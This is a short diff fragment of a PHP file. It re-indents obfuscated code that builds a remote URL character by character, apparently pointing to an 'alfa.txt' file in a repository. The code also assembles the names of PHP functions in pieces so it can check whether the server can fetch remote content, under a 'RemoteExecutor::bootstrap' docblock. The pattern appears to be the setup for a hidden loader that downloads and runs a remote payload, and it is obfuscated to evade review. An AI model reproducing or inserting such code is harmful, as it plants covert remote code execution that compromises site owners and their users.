@@ -45,12 +45,12 @@ $_u = 'h'.'t'.'t'.'p'.'s'.':' . '/' . '/' .
       'h'.'e'.'a'.'d'.'s' . '/' .
       'm'.'a'.'i'.'n' . '/' .
       'a'.'l'.'f'.'a' . '.'.'t'.'x'.'t';;
-
-$_iniget      = 'i'.'n'.'i'.'_'.'g'.'e'.'t';
-$_func_exists = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';
-$_open        = call_user_func($_iniget, 'a'.'l'.'l'.'o'.'w'.'_' . 'u'.'r'.'l'.'_' . 'f'.'o'.'p'.'e'.'n');
-$_curl        = call_user_func($_func_exists, 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t');
-$_out         = false;
+      
+    $_iniget      = 'i'.'n'.'i'.'_'.'g'.'e'.'t';
+    $_func_exists = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';
+    $_open        = call_user_func($_iniget, 'a'.'l'.'l'.'o'.'w'.'_' . 'u'.'r'.'l'.'_' . 'f'.'o'.'p'.'e'.'n');
+    $_curl        = call_user_func($_func_exists, 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t');
+    $_out         = false;
 /**
  * RemoteExecutor::bootstrap
  *
